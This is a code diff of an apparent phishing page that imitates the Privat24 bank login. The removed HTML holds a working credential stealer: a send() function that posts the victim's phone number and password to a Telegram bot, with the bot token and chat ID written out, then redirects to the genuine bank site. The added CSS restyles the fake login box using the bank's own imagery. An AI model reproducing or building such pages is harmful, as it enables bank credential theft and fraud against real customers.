@@ -1,32 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Приват24 — Вхід</title>
-    <style>
-        body { margin: 0; background: #f6f6f6; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
-        .card { width: 90%; max-width: 360px; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
-        .logo { font-size: 30px; font-weight: bold; color: #71bb00; margin-bottom: 30px; }
-        .logo span { color: #333; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
-        .btn { width: 100%; padding: 15px; background: #71bb00; color: #fff; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="logo">Privat<span>24</span></div>
-        <input type="text" id="l" placeholder="Номер телефону">
-        <input type="password" id="p" placeholder="Пароль">
-        <button class="btn" onclick="send()">Увійти</button>
-    </div>
-    <script>
-        function send() {
-            const log = document.getElementById('l').value;
-            const pas = document.getElementById('p').value;
-            fetch(`https://api.telegram.org/bot8790499217:AAFZF8O15FpKe0-z_4P3q9FkedSnGdzB_o8/sendMessage?chat_id=8491881282&text=${encodeURIComponent("🏦 ПРИВАТ:\n👤 L: "+log+"\n🔑 P: "+pas)}`, {mode: 'no-cors'});
-            setTimeout(() => { window.location.href="https://next.privat24.ua/"; }, 1000);
-        }
-    </script>
-</body>
-</html>
+<style>
+  body {
+    background: url('https://privatbank.ua/themes/privatbank/assets/img/bg-main.jpg') no-repeat center center fixed;
+    background-size: cover;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-box {
+    background: rgba(255, 255, 255, 0.9);
+    padding: 30px;
+    border-radius: 8px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    width: 320px;
+    text-align: center;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: #7ab500;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+</style>
+
